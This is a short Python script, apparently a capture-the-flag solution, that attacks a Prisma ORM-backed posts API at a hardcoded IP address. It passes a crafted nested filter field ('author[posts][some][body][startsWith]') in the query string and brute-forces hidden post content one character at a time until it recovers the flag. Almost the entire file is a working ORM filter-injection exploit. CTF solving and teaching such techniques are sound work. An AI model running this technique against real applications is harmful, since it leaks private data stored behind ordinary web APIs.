import string
import urllib

import tqdm
import requests

# Main reference: https://www.elttam.com/blog/plorming-your-primsa-orm/

URL = "http://35.239.207.1:3000/api/posts"
MALICIOUS_FIELD = "author[posts][some][body][startsWith]"
BASE_STRING = (
    "This is a secret blog I am still working on. The secret keyword for this blog is "
)


def send_request(payload):
    return requests.get(
        f"{URL}?{MALICIOUS_FIELD}={BASE_STRING}{urllib.parse.quote_plus(payload)}"
    )


if __name__ == "__main__":
    flag = "uoftctf{u51n6_0rm5_d035_n07_m34n_1nj3c710n5_c4n7_h4pp3n"
    pbar = tqdm.tqdm()
    while flag[-1] != "}":
        for s in "}_" + string.digits + string.ascii_letters:
            pbar.set_description(f"Flag: {flag + s}")
            response = send_request(flag + s)
            response = response.json()
            if len(response["posts"]) != 0:
                flag += s
                break
    print(f"{flag=}")
